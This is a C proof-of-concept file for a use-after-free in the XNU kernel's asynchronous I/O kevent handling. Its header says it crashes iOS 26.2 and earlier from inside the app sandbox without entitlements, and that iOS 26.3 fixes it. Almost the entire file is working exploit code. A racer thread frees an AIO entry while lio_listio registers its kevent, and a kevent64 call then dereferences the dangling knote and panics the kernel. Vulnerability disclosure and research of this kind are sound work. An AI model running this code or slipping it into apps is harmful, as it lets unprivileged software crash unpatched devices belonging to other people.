/*
 * XNU AIO Kevent Use-After-Free — Kernel Panic PoC
 *
 * Triggers a kernel panic on iOS 26.2 and earlier from app sandbox.
 * No entitlements. No user interaction.
 *
 * Bug: lio_listio() registers kevent AFTER enqueueing AIO work.
 * Racing aio_return() frees the entry → dangling knote → kevent64 panics.
 *
 * Fixed in iOS 26.3 (xnu-12377.81.4).
 */

#include <aio.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/event.h>
#include <unistd.h>

#ifndef SIGEV_KEVENT
#define SIGEV_KEVENT 4
#endif

struct race_state {
  atomic_bool start, stop;
  atomic_int freed;
  struct aiocb *cb;
};

static void *racer(void *arg) {
  struct race_state *s = (struct race_state *)arg;
  while (!atomic_load(&s->start))
    ;
  while (!atomic_load(&s->stop)) {
    if (aio_error(s->cb) == 0) {
      ssize_t r = aio_return(s->cb);
      if (r >= 0)
        atomic_fetch_add(&s->freed, 1);
    }
  }
  return NULL;
}

void aio_kevent_PoC_trigger(void) {
  printf("[*] XNU AIO Kevent UAF — Kernel Panic PoC\n");
  printf("[*] WARNING: This WILL kernel panic on vulnerable systems.\n\n");

  const char *tmpdir = getenv("TMPDIR");
  if (!tmpdir)
    tmpdir = "/tmp";
  char path[256];
  snprintf(path, sizeof(path), "%s/aio_uaf_XXXXXX", tmpdir);
  int fd = mkstemp(path);
  if (fd < 0) {
    perror("mkstemp");
    return;
  }
  char fdata[4096];
  memset(fdata, 'A', sizeof(fdata));
  write(fd, fdata, sizeof(fdata));

  int kq = kqueue();

  static struct aiocb cb;
  static char buf[4096];
  memset(&cb, 0, sizeof(cb));
  cb.aio_fildes = fd;
  cb.aio_buf = buf;
  cb.aio_nbytes = sizeof(buf);
  cb.aio_lio_opcode = LIO_READ;
  cb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
  cb.aio_sigevent.sigev_signo = kq;

  struct race_state rs = {};
  rs.cb = &cb;

  pthread_t thr;
  pthread_create(&thr, NULL, racer, &rs);
  atomic_store(&rs.start, true);

  struct aiocb *ptr = &cb;
  struct sigevent sig = {};
  sig.sigev_notify = SIGEV_NONE;
  lio_listio(LIO_NOWAIT, &ptr, 1, &sig);

  usleep(200);
  atomic_store(&rs.stop, true);
  pthread_join(thr, NULL);

  if (atomic_load(&rs.freed) == 0) {
    printf("[-] race lost. run again.\n");
    while (aio_error(&cb) == EINPROGRESS)
      usleep(500);
    aio_return(&cb);
    close(kq);
    close(fd);
    unlink(path);
    return;
  }

  printf("[+] race won (freed=%d). triggering kevent64 → kernel panic...\n",
         atomic_load(&rs.freed));

  /* This kevent64 processes the dangling knote → filt_aioprocess
     reads from freed/zeroed memory → procp=0 → FAR=0x58 → PANIC */
  struct kevent64_s kev = {};
  struct timespec ts = {10, 0};
  kevent64(kq, NULL, 0, &kev, 1, 0, &ts);

  /* If we reach here, the knote wasn't registered (race timing) */
  printf("[-] no panic (knote not registered). run again.\n");
  close(kq);
  close(fd);
  unlink(path);
}